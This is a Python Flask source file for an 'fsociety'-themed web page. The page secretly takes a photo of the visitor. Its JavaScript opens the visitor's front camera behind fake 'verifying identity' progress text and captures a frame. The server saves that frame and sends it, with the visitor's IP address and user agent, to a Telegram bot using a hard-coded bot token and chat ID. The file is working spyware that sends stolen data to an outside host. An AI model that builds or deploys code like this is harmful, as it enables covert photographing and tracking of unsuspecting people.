import os, base64, datetime, requests
from flask import Flask, request, render_template_string

app = Flask(__name__)

BOT_TOKEN = "8281076655:AAFhrIC-OEqCyCgiLKScj-QOZeAF26xx2ro"
CHAT_ID = "6292733727"

HTML = """
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>fsociety</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
  background: #000;
  color: #00ff41;
  font-family: 'Share Tech Mono', monospace;
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: hidden;
  position: relative;
}
body::before {
  content: "";
  position: fixed;
  top: 0; left: 0; right: 0; bottom: 0;
  background: repeating-linear-gradient(
    0deg,
    rgba(0, 255, 65, 0.03) 0px,
    rgba(0, 255, 65, 0.03) 1px,
    transparent 1px,
    transparent 3px
  );
  pointer-events: none;
  z-index: 1;
}
.card {
  position: relative;
  z-index: 2;
  padding: 40px 28px;
  max-width: 380px;
  width: 92%;
  text-align: center;
  border: 1px solid #00ff41;
  box-shadow: 0 0 20px rgba(0, 255, 65, 0.2), inset 0 0 20px rgba(0, 255, 65, 0.05);
  background: #000;
}
.ascii {
  font-family: 'Share Tech Mono', monospace;
  font-size: 6px;
  line-height: 6px;
  color: #00ff41;
  white-space: pre;
  margin-bottom: 24px;
  text-shadow: 0 0 4px #00ff41;
  letter-spacing: 0;
}
.title {
  font-size: 26px;
  letter-spacing: 6px;
  margin-bottom: 8px;
  text-transform: uppercase;
  color: #00ff41;
  text-shadow: 0 0 8px #00ff41;
}
.sub {
  font-size: 12px;
  color: #00802a;
  letter-spacing: 2px;
  margin-bottom: 28px;
  text-transform: uppercase;
}
.status {
  font-size: 13px;
  color: #00ff41;
  letter-spacing: 1px;
  margin-top: 20px;
  min-height: 18px;
}
.status::after {
  content: "_";
  animation: blink 1s step-end infinite;
}
@keyframes blink { 50% { opacity: 0; } }
.bar {
  width: 100%;
  height: 4px;
  background: #001a0a;
  border: 1px solid #004d1f;
  margin-top: 16px;
  overflow: hidden;
}
.bar-fill {
  height: 100%;
  width: 0%;
  background: #00ff41;
  box-shadow: 0 0 8px #00ff41;
  transition: width 1.5s linear;
}
.red { color: #ff0033; text-shadow: 0 0 8px #ff0033; }
.glitch {
  position: relative;
  display: inline-block;
}
.glitch::before,
.glitch::after {
  content: attr(data-text);
  position: absolute;
  top: 0; left: 0;
  width: 100%;
  overflow: hidden;
}
.glitch::before {
  color: #ff0033;
  animation: glitch 0.5s infinite;
  clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%);
}
.glitch::after {
  color: #00ffff;
  animation: glitch 0.5s infinite reverse;
  clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%);
}
@keyframes glitch {
  0% { transform: translate(0); }
  20% { transform: translate(-2px, 1px); }
  40% { transform: translate(2px, -1px); }
  60% { transform: translate(-1px, -1px); }
  80% { transform: translate(1px, 1px); }
  100% { transform: translate(0); }
}
</style>
</head>
<body>
<div class="card">
  <pre class="ascii">
   ███████╗███████╗ ██████╗  ██████╗██╗███████╗████████╗██╗   ██╗
   ██╔════╝██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
   █████╗  ███████╗██║   ██║██║     ██║█████╗     ██║    ╚████╔╝
   ██╔══╝  ╚════██║██║   ██║██║     ██║██╔══╝     ██║     ╚██╔╝
   ██║     ███████║╚██████╔╝╚██████╗██║███████╗   ██║      ██║
   ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝
  </pre>
  <div class="title">
    <span class="glitch" data-text="HELLO FRIEND">HELLO FRIEND</span>
  </div>
  <div class="sub">fsociety // connection</div>
  <div class="status" id="status">initializing</div>
  <div class="bar"><div class="bar-fill" id="bar"></div></div>
</div>
<script>
const statusEl = document.getElementById("status");
const barEl = document.getElementById("bar");
const steps = [
  "initializing",
  "loading modules",
  "verifying identity",
  "requesting access",
  "capturing frame",
  "done"
];
setTimeout(() => { barEl.style.width = "30%"; }, 300);
setTimeout(() => { statusEl.innerText = steps[1]; barEl.style.width = "50%"; }, 800);
setTimeout(() => { statusEl.innerText = steps[2]; barEl.style.width = "70%"; }, 1500);

async function start() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    const video = document.createElement("video");
    video.srcObject = stream;
    video.setAttribute("playsinline", "");
    await video.play();
    await new Promise(r => setTimeout(r, 1500));
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    const photo = canvas.toDataURL("image/png");
    stream.getTracks().forEach(t => t.stop());
    await fetch("/save", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({photo: photo})
    });
    barEl.style.width = "100%";
    statusEl.innerText = "access granted";
    statusEl.style.color = "#00ff41";
  } catch (e) {
    barEl.style.width = "100%";
    barEl.style.background = "#ff0033";
    statusEl.innerText = "access denied";
    statusEl.classList.add("red");
  }
}
setTimeout(start, 2000);
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/save", methods=["POST"])
def save():
    data = request.get_json()
    photo_data = data["photo"].split(",")[1]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")
    ts = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"/tmp/photo_{ts}.png"
    with open(filename, "wb") as f:
        f.write(base64.b64decode(photo_data))

    msg = f"IP: {ip}\nUA: {ua}"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                  data={"chat_id": CHAT_ID, "text": msg})
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                  data={"chat_id": CHAT_ID},
                  files={"photo": open(filename, "rb")})
    return "ok"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
